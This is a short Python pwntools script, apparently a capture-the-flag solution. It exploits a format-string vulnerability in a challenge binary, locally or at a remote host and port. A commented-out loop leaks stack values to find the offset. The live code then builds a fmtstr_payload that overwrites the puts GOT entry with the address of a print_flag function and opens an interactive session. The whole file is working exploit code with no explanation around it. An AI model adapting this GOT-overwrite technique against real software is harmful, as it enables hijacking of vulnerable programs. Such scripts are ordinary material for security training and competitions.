#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./binary")


def start(argv=[], *a, **kw):
    host = args.HOST or 'rumble.host'
    port = int(args.PORT or 20776)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendlineafter(b"date:\n", b"1")

# payload = ""
# for i in range(1, 30):
#     payload += "%p|"
#
# io.sendlineafter(b"location:\n", payload.encode())
#
# io.recvuntil(b"LOCATION: ")
# leak = io.recvline().strip().decode().split("|")[:-1]
#
# offset = 0
# for lk in leak:
#     offset += 1
#     if lk == "(nil)":
#         continue
#     lk = int(lk, 16)
#     print(f"{offset}: {p64(lk)}")

control_offset = 12

payload = fmtstr_payload(
    control_offset, {
        elf.got["puts"]: elf.symbols["print_flag"]})

io.sendlineafter(b"location:\n", payload)
log.info(f"{payload=}")

io.interactive()
